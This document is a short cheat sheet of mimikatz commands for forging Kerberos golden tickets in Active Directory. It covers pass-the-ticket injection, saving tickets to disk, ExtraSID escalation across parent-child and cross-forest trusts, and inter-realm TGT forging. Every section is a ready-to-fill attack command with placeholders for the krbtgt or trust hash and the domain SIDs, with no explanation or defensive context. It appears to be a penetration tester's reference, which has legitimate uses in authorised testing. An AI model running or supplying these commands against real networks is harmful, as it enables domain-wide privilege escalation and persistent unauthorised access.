# mimikatz

% mimikatz, passwords
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 


## golden - ptt
```
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<user|administrator> /id:<user_rid|500> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /ptt" "exit"
```

## golden - save
```
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<user|administrator> /id:<user_rid|500> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /ticket:c:\temp\trust.kirbi" "exit"
```

## golden - ExtraSID (parent-child) 
```
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<user|jubeaz> /id:<user_rid> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /sids:<dst_domain_sid>-<rid|519> /ptt" "exit"
```

## golden - ExtraSID (parent-child) (dc account)
```
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<dc_name>$ /id:<dc_rid> /krbtgt:<krbtgt_nthash>  /groups:516 /sid:<domain_sid> /domain:<domain_fqdn> /sids:<dst_domain_sid>-<rid|516> /ptt" "exit"
```

## golden - ExtraSID (cross-forest)
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<user> /id:<user_rid> /krbtgt:<krbtgt_nthash> /group:500,501,513,512,520,518 /sid:<domain_sid> /domain:<domain_fqdn> /sids:<dst_domain_sid>-<rid>  /ptt" "exit"
```

## golen - Inter-Realm TGT  
```
mimikatz.exe "privilege::debug"  "kerberos::golden /user:<user> /id:<user_rid> /group:500,501,513,512,520,518 /rc4:<trust_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /sids:<dst_domain_sid>-<rid|519> /service:krbtgt /target:<dst_domain_fqdn> /ptt" "exit"
```